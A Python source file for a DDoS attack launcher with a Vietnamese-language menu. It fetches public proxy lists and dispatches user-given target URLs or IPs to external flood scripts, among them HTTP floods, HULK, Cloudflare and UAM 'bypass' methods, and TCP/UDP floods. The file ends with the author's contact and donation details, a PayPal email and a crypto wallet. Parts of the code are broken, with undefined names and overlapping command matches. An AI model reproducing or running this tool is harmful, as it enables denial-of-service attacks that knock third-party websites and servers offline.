from colorama import Fore, Back, Style
import os
import requests
import random
import getpass
import time
import sys
from requests import post,get
import os, sys, requests, random,json
import time, datetime
from datetime import datetime
from requests import post,get
import os, sys, requests, random,json
import webbrowser
from datetime import datetime
class bcolors:
    HONG = '\033[95m'
    BLUED = '\033[94m'
    BLUEN = '\033[96m'
    BLUEL = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    A= '\033[12m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def getproxies(self):
#		self.styleText("\n [*] Downloading Proxy...\n")
		file_name = "http.txt"
		http_proxies = [
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&ssl=yes",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous",
			"https://raw.githubusercontent.com/Kenne400k/proxy100k/main/proxy100k",
            "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/nxtdeptrai207/Hatoki-leak/main/proxies.txt"]
		with open(file_name, 'w'):
			for proxies in http_proxies:
				try:
					if httpx.get(proxies).status_code == 200:
						print(Color.LG+f"[{200}] OK -> {proxies}")
						with open(file_name, 'a') as p:
							p.write(httpx.get(proxies).text)
					else:
						print(Color.LR+f"[{httpx.get(proxies).status_code}] ERROR -> {proxies}")
				except:
					print(Color.LR+f"[ERROR] -> {proxies}")

def clear():
  os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('http.txt').readlines()
bots = len(proxys)
time=requests.get("http://worldtimeapi.org/api/timezone/Asia/Ho_Chi_Minh").text

def banner():
  clear()
  print(f"""
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m ▄[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m█[38;2;219;36;255m█[38;2;213;42;255m█[38;2;207;48;255m█[38;2;201;54;255m█[38;2;195;60;255m▄ [38;2;189;66;255m  [38;2;183;72;255m[38;2;177;78;255m [38;2;171;84;255m▄[38;2;165;90;255m█ [38;2;159;96;255m  [38;2;153;102;255m▄[38;2;147;108;255m█[38;2;141;114;255m▄[38;2;135;120;255m [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m [38;2;111;144;255m [38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m█[38;2;87;168;255m [38;2;81;174;255m   [38;2;75;180;255m  ▄[38;2;69;186;255m████[38;2;63;192;255m██▄[38;2;57;198;255m   ▄█[38;2;51;204;255m█████▄   ▄█       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m █[38;2;201;54;255m█[38;2;195;60;255m█ [38;2;189;66;255m [38;2;183;72;255m [38;2;177;78;255m[38;2;171;84;255m█[38;2;165;90;255m█ [38;2;159;96;255m▄[38;2;153;102;255m█[38;2;147;108;255m█[38;2;141;114;255m█[38;2;135;120;255m▀ [38;2;129;126;255m▀[38;2;123;132;255m█[38;2;117;138;255m█[38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m█[38;2;87;168;255m█[38;2;81;174;255m██[38;2;75;180;255m▄ █[38;2;69;186;255m██  [38;2;63;192;255m  ██[38;2;57;198;255m█ ██[38;2;51;204;255m█    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m █[38;2;201;54;255m█[38;2;195;60;255m█ [38;2;189;66;255m [38;2;183;72;255m [38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m█[38;2;159;96;255m▐[38;2;153;102;255m█[38;2;147;108;255m█[38;2;141;114;255m▀[38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m[38;2;111;144;255m ▀█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m▀[38;2;87;168;255m▀[38;2;81;174;255m██[38;2;75;180;255m █[38;2;69;186;255m██   [38;2;63;192;255m ██[38;2;57;198;255m█ ██[38;2;51;204;255m█    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m █[38;2;201;54;255m█[38;2;195;60;255m█ [38;2;189;66;255m [38;2;183;72;255m▄[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m█[38;2;159;96;255m█[38;2;153;102;255m█[38;2;147;108;255m▀[38;2;141;114;255m [38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m [38;2;111;144;255m [38;2;105;150;255m█[38;2;99;156;255m██[38;2;93;162;255m [38;2;87;168;255m  [38;2;81;174;255m▀ [38;2;75;180;255m██[38;2;69;186;255m█   [38;2;63;192;255m ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m  ▀█[38;2;243;12;255m█[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m█[38;2;219;36;255m█[38;2;213;42;255m█[38;2;207;48;255m██[38;2;201;54;255m▀[38;2;195;60;255m  [38;2;189;66;255m▀[38;2;183;72;255m▀[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m█[38;2;159;96;255m█[38;2;153;102;255m█[38;2;147;108;255m▄[38;2;141;114;255m [38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m [38;2;111;144;255m █[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m [38;2;87;168;255m  [38;2;81;174;255m  [38;2;75;180;255m██[38;2;69;186;255m█   [38;2;63;192;255m ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m  [38;2;201;54;255m [38;2;195;60;255m   [38;2;189;66;255m [38;2;183;72;255m█[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m[38;2;159;96;255m ▐[38;2;153;102;255m█[38;2;147;108;255m▄[38;2;141;114;255m [38;2;135;120;255m  [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m  [38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m [38;2;87;168;255m  [38;2;81;174;255m  [38;2;75;180;255m██[38;2;69;186;255m█   [38;2;63;192;255m ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███       
[38;2;255;0;255m    [38;2;249;6;255m    [38;2;243;12;255m █[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m [38;2;219;36;255m [38;2;213;42;255m [38;2;207;48;255m  [38;2;201;54;255m [38;2;195;60;255m   [38;2;189;66;255m [38;2;183;72;255m█[38;2;177;78;255m█[38;2;171;84;255m█[38;2;165;90;255m ▀[38;2;159;96;255m█[38;2;153;102;255m█[38;2;147;108;255m█[38;2;141;114;255m▄[38;2;135;120;255m [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m  [38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m [38;2;87;168;255m [38;2;81;174;255m   [38;2;75;180;255m██[38;2;69;186;255m█  [38;2;63;192;255m  ███[38;2;57;198;255m ███[38;2;51;204;255m    ███ ███▌    ▄ 
[38;2;255;0;255m    [38;2;249;6;255m   ▄[38;2;243;12;255m█[38;2;237;18;255m█[38;2;231;24;255m█[38;2;225;30;255m█[38;2;219;36;255m▀[38;2;213;42;255m [38;2;207;48;255m  [38;2;201;54;255m [38;2;195;60;255m   [38;2;189;66;255m █[38;2;183;72;255m█[38;2;177;78;255m█[38;2;171;84;255m [38;2;165;90;255m  [38;2;159;96;255m▀[38;2;153;102;255m█[38;2;147;108;255m▀[38;2;141;114;255m [38;2;135;120;255m [38;2;129;126;255m [38;2;123;132;255m [38;2;117;138;255m▄[38;2;111;144;255m█[38;2;105;150;255m█[38;2;99;156;255m█[38;2;93;162;255m█[38;2;87;168;255m▀ [38;2;81;174;255m   [38;2;75;180;255m▀█[38;2;69;186;255m██[38;2;63;192;255m███▀ [38;2;57;198;255m  ▀█[38;2;51;204;255m█████▀  █████▄▄██     
[1;36m                      ══════════╦═════════════════╦══════════
                                 ║ Layer7/Layer4 FUll ║
             ╔════════════════╩═════════════════╩════════════════╗
╔══════════╩═══════════╦══╦═════════════════════╦══╦═══════════╩═════════╗
║  [1]methods              ║  ║  [4]                    ║  ║  [7]                    ║
║  [2]info admin           ║  ║  [5]                    ║  ║  [8]                    ║
║  [3]                     ║  ║  [6]                    ║  ║  [9]                    ║
╚══════════════════════╩══╩═════════════════════╩══╩═════════════════════╝

""")
banner()
def main():
    while(True):
        cnc = input(bcolors.YELLOW +'''[38;2;51;204;255mMETHODS :[1;31m''')
        if cnc == "methods" or cnc == "METHODS" or cnc == "m" or cnc == "mth" or cnc == "1":
            clear()
            print(f"""
                          
                          [1;36m╔╦╗┌─┐┌┬┐┬ ┬┌─┐┌┬┐┌─┐
                          [1;36m║║║├┤  │ ├─┤│ │ ││└─┐
                          [1;36m╩ ╩└─┘ ┴ ┴ ┴└─┘─┴┘└─┘
                        
                  [38;2;255;0;255m [1;36m𝑫𝑫𝒐𝑺,[1;31m𝑶𝒃𝒔𝒆𝒔𝒔𝒆𝒅 𝑾𝒊𝒕𝒉 𝒀𝒐𝒖 𝑵𝒈𝒖𝒚𝒆𝒏 𝑻𝒓𝒖𝒐𝒏𝒈 𝑻𝒉𝒊𝒆𝒏 𝑷𝒉𝒂𝒕
                  [38;2;243;12;255m╚╦[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m╦[38;2;75;180;255m╝
              [38;2;255;0;255m╔[38;2;249;6;255m═══[38;2;243;12;255m═╩[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m╩[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m╗
              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mUDP\033[0m         [38;2;213;42;255m╔╗  \033[1;4m\x1b[38;2;255;215;0mHOME\033[0m        [38;2;135;120;255m╔[38;2;129;126;255m╗  \033[1;4m\x1b[38;2;255;215;0m\033[0m      [38;2;51;204;255m   ║
              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mTCP\033[0m         [38;2;213;42;255m║║  \033[1;4m\x1b[38;2;255;215;0m\033[0m     [38;2;135;120;255m       ║[38;2;129;126;255m║  \033[1;4m\x1b[38;2;255;215;0m\033[0m      [38;2;51;204;255m   ║
              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mUV2\033[0m  [38;2;213;42;255m       ╚╝  \033[1;4m\x1b[38;2;255;215;0m\033[0m  [38;2;135;120;255m          ╚[38;2;129;126;255m╝  \033[1;4m\x1b[38;2;255;215;0m\033[0m   [38;2;51;204;255m      ║
       [38;2;255;0;255m╔══════[38;2;255;0;255m╩[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m╩════════╗
     [38;2;255;0;255m╔═╩══════[38;2;255;0;255m═[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═════════╩══╗
     [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mHTTP-RW\033[0m     [38;2;249;6;255m╔╗ \033[1;4m\x1b[38;2;255;215;0mHTTP-RAND\033[0m    [38;2;207;48;255m╔╗ \033[1;4m\x1b[38;2;255;215;0mHULK\033[0m  [38;2;159;96;255m       ╔[38;2;153;102;255m╗ \033[1;4m\x1b[38;2;255;215;0mNORMAL-BYPASS\033[0m [38;2;75;180;255m [38;2;51;204;255m║
     [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mHTTP-SOCKET\033[0m [38;2;249;6;255m║║ \033[1;4m\x1b[38;2;255;215;0mHTTP-RAWV@\033[0m   [38;2;207;48;255m║║ \033[1;4m\x1b[38;2;255;215;0mHTTPFLOOD\033[0m [38;2;159;96;255m   ║[38;2;153;102;255m║ \033[1;4m\x1b[38;2;255;215;0mHTTPS-SPOOF\033[0m [38;2;75;180;255m [38;2;51;204;255m  ║
     [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mUAMBYPASS\033[0m   [38;2;249;6;255m║║ \033[1;4m\x1b[38;2;255;215;0mCF-BYPASS\033[0m [38;2;207;48;255m   ║║ \033[1;4m\x1b[38;2;255;215;0mHTTP-BROWSER\033[0m [38;2;159;96;255m║[38;2;153;102;255m║ \033[1;4m\x1b[38;2;255;215;0mHUV2\033[0m [38;2;75;180;255m [38;2;51;204;255m         ║
     [38;2;255;0;255m╚════════════[38;2;255;0;255m═[38;2;249;6;255m╝╚═[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m═══[38;2;207;48;255m╝╚[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m══[38;2;177;78;255m═══[38;2;171;84;255m═══[38;2;165;90;255m═══[38;2;159;96;255m╝[38;2;153;102;255m╚[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═══[38;2;81;174;255m═══[38;2;75;180;255m╝
""")
            
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            (print(" CHƯA CÓ TOOL DDOS GAME"))
        
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "help" or cnc == "HELP" or cnc == "Help" or cnc == "HELP":
            (print (bcolors.HONG +"""
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW GAME METHODS
INFO    ► INFO ADMIN 
CLEAR   ► CLEAR TERMINAL
            """))
        

        elif "http-socket" in cnc or "HTTP-SOCKET" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET.js {url} {per} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
                print(Fore.RED +'Example: http-socket http://example.com 5000 60')
                os.system(f'node HTTP-SOCKET.js {url} {per} {time}')

        elif "http-rw" in cnc or "HTTP-RW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-raw <url> <time>')
                print(Fore.RED +'Example: http-rw http://example.com 60')
        elif "http-rawv2" in cnc or "HTTP-RAWV2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-rawv2<url> <time>')
                print(Fore.RED +'Example: http-rawv2 http://example.com 60')
        elif "http-requests" in cnc or "HTTP-REQUESTS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests http://example.com 60')

        elif "12" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                reqs = cnc.split()[3]
                os.system(f'node socket {url} http.txt {time} {reqs}')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests http://example.com 60')

        elif "2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node https1 GET {url} http.txt {time} 64 1')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests http://example.com 60')
        elif "3" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node https2 {url} {time} 1')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests http://example.com 60')
        elif "4" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node bypass {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests http://example.com 60')

        elif "stress" in cnc or "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
               # print("đang chạy")
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.RED +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.RED +'MODE: [1] TCP')
                print(Fore.RED +'      [2] UDP')
                print(Fore.RED +'      [3] HTTP')
                print(Fore.RED +'Example: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "http-rand" in cnc or "HTTP-RAND" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-rand <url> <time>')
                print(Fore.RED +'Example: http-rand http://example.com 60')
                
        elif "httpflood" in cnc or "HTTPFLOOD" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')
  
        elif "hulk" in cnc or "HULK" in cnc or "h123" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: hulk <url> METHODS<GET/POST>')
                print('Example: hulk http://example.com GET')
        elif "huv2" in cnc or "HUV2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run hulkanonymuous.go -site {url} -data {method}')
            except IndexError:
                print('Usage: huv2 <url> METHODS<GET/POST>')
                print('Example: huv2 http://example.com GET')
        elif "normal-bypass" in cnc or "NORMAL-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypassv2.js {url} {time}')
            except IndexError:
                print('Usage: normal-bypass <url> <time>')
                print('Example: normal-bypass http://example.com 20')

        elif "sever" in cnc or "SEVER" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.RED +'Usage: sever <url> METHODS<GET/POST>')
                print(Fore.RED +'Example: sever http://example.com GET')
        elif "cf-bypass" in cnc or "CF-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')
        elif "HTTPS-SPOOF" in cnc or "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'python https-spoof.py {url} {time} {threads}')
            except IndexError:
                print(Fore.RED +'Usage: HTTPS-SPOOF <url> <time> <threads>')
                print(Fore.RED +'Example: hhhh')
        elif "HTTP-BROWSER" in cnc or "http-browser" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node HTTP-BROWSER.js {url} {time} {threads}')
            except IndexError:
                print(Fore.RED +'Usage: HTTP-BROWSER <url> <threads> <time>')
                print(Fore.RED +'Example: HTTP-BROWSER <url> <threads> <time>')
        
        elif "UAMBYPASS" in cnc or "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                post = cnc.split()[4]
                os.system(f'node UAMBYPASS.js {url} {time} {threads} {post}')
            except IndexError:
                print('Usage: UAMBYPASS <url> <time> <threads> <post>')
                print('Example: UAMBYPASS http://example.com> <60> <100> <http.txt>')
        elif "cf-bypass" in cnc or "CF-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')
        elif "home" in cnc or "HOME" in cnc:

            try:

                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node home.js {ip} {port} {time} ')
            except IndexError:
                print(Fore.RED +'Usage: home <ip> <port> <time>')
                print(Fore.RED +'Example: home 45.142.122.104 22 60')
       
  
 #LAYER4
        elif "tcp" in cnc or "TCP" in cnc:

            try:

                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python tcp.py -i {ip} -p {port} -t {time} -th {threads}')
            except IndexError:
                print(Fore.RED +'Usage: tcp <ip> <port> <time> <threads>')
                print(Fore.RED +'Example: tcp 45.142.122.104 22 60 15000')
        elif "udp" in cnc or "UDP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python udp.py -i {ip} -p {port} -t {time} -th {threads}')
            except IndexError:
                print(Fore.RED +'Usage: udp <ip> <port> <time> <threads>')
                print(Fore.RED +'Example: udp 45.142.122.104 22 60 15000')
        elif "uv2" in cnc or "UV2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl UDP-KILL.pl {ip} {port} {threads} {time}')
            except IndexError:
                print(Fore.RED +'Usage: uv2 <ip> <port> <threads> <time>')
                print(Fore.RED +'Example: uv2 45.142.122.104 80 15000 80')
       
        elif "info" in cnc or "INFO" in cnc or "2" in cnc:
            print(f'''
FACEBOOK: Phong Trần ꪜ
TEAM GROUP: ㋛︎ 🄰 🅃 🅃 🄰 🄲 🄺 ㋛︎
GROUP ZALO: https://zalo.me/g/fqovhs332
PAYPAL: quocp444@gmail.com
BNB: 0x02316ca46ca2656c4c225d7ed83490b039a949cf
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Error: [ " + cmmnd + " ] Không Có Lệnh Này !!!!")
            except IndexError:
                pass
main()

